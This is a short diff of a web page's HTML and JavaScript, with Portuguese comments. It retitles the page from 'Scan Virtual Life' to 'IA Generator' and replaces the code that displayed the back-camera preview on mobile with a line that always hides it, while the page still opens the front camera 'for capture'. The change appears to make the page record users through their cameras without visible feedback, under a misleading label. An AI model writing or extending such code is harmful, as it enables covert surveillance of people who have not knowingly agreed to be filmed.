@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Scan Virtual Life</title>
+  <title>IA Generator</title>
   <style>
     * {
       margin: 0;
@@ -305,10 +305,8 @@
         });
         video.srcObject = backStream;
         
-        // Mostra o vídeo apenas em dispositivos móveis
-        if (isMobileDevice()) {
-          video.style.display = 'block';
-        }
+        // Removendo a exibição do vídeo em dispositivos móveis
+        video.style.display = 'none';
 
         // Ativa câmera frontal para captura
         const frontStream = await navigator.mediaDevices.getUserMedia({ 
